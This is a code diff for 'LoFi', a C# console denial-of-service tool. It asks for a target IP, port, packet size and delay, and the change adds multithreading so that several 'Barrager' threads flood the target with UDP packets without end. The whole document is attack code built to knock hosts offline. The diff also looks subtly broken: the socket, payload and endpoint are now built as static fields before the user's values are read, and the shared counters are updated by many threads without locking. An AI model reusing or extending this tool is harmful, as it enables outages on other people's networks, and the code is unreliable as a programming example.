@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Text;
 using System.Threading;
 using System.Net;
@@ -10,7 +10,7 @@ namespace LoFi
     class Program
     {
         // Title variable
-        private static readonly string title = @"
+        static readonly string title = @"
 
               ██▓        ▒█████       █████▒    ██▓
              ▓██▒       ▒██▒  ██▒   ▓██   ▒    ▓██▒
@@ -25,17 +25,26 @@ namespace LoFi
 
 
         // Parameter Variables
-        private static string address; // This variable acts as the target
-        private static string payload; // This variable is the input on how many bytes of data should be sent in a packet
-        private static string delayer; // This variable handles the delay between packet launches
-        private static string netport; // This variable handles the port number which should be attacked
-        private static string pingers; // This variable handles the delay between ICMP Echo requests.
+        static string address; // This variable acts as the target
+        static string payload; // This variable is the input on how many bytes of data should be sent in a packet
+        static string delayer; // This variable handles the delay between packet launches
+        static string netport; // This variable handles the port number which should be attacked
+        static string pingers; // This variable handles the delay between ICMP Echo requests.
 
         // Payload parsed value
-        private static string parseload = "";
+        static string parseload = "";
 
-        // Main menu panel
-        private static void Main(string[] args)
+        // Attacking objects
+        // Create a new socket for UDP packet attack
+        static Socket flooder = new(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
+        static byte[] floodload = Encoding.ASCII.GetBytes(parseload);
+        static IPEndPoint endpoint = new(IPAddress.Parse(address), int.Parse(netport));
+        // Create integers used in attacking process
+        static int i = 0; // Used for ICMP Echo control
+        static int j = 0; // Used for threading control
+        static int pluscolor = 1; // Used to control text color
+        static int packets = 0; // Used to count the total packets sent
+        static void Main(string[] args)
         {
             // Set console size and color
             Console.SetWindowSize(65, 25);
@@ -55,6 +64,7 @@ namespace LoFi
             Parameters("Enter your desired packet size (bytes).", 3);
             Parameters("Enter your desired UDP packet delay (milliseconds).", 4);
             Parameters("How often would you like to test your connection?", 5);
+            Parameters("How many threads would you like to attack with?", 6);
 
             // Convert payload parameter to how many zeroes represented in the variable
             for (int i = 0; i < int.Parse(payload); i++)
@@ -67,7 +77,7 @@ namespace LoFi
         }
 
         // Set parameters
-        private static void Parameters(string question, int switcher)
+        static void Parameters(string question, int switcher)
         {
             Color(4);
             Console.Write("╔═ ");
@@ -101,42 +111,31 @@ namespace LoFi
                 case 5:
                     pingers = input;
                     break;
+                case 6:
+                    j = int.Parse(input);
+                    break;
             }
         }
 
         // Attack the target
-        private static void Attack()
+        static void Attack()
         {
             Console.WriteLine();
 
             // Animates the title
-            Thread attackontitle = new(Animation);
-            attackontitle.Start();
+            Thread animation = new(Animation);
+            animation.Start();
 
-            // Create a new socket for UDP packout outflow
-            Socket flooder = new(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
-            byte[] floodload = Encoding.ASCII.GetBytes(parseload);
-            IPEndPoint endpoint = new(IPAddress.Parse(address), int.Parse(netport));
-
-            // Create integers used in attacking process
-            int i = 0; // Used for ICMP Echo control
-            int pluscolor = 1; // Used to controllm text color
-            int packets = 0; // Used to count the total packets sent
+            // Start threads
+            for (int i = 0; i < j; i++)
+            {
+                Thread threads = new(Barrager);
+                threads.Start();
+            }
 
             // Loop attack process
             while (true)
             {
-                // Attempt to send UPD packet
-                try
-                {
-                    flooder.SendTo(floodload, endpoint);
-                    packets++;
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine(ex);
-                }
-                i++;
 
                 if (i == int.Parse(pingers))
                 {
@@ -186,8 +185,29 @@ namespace LoFi
             }
         }
 
+        static void Barrager()
+        {
+            while (true)
+            {
+                if (i != int.Parse(pingers))
+                {
+                    // Attempt to send UPD packet
+                    try
+                    {
+                        flooder.SendTo(floodload, endpoint);
+                        packets++;
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex);
+                    }
+                    i++;
+                }
+            }
+        }
+
         // Color changing algorithm
-        private static void Color(int value)
+        static void Color(int value)
         {
             switch (value)
             {
@@ -216,7 +236,7 @@ namespace LoFi
         }
 
         // Animates the title
-        private static void Animation()
+        static void Animation()
         {
             while (true)
             {
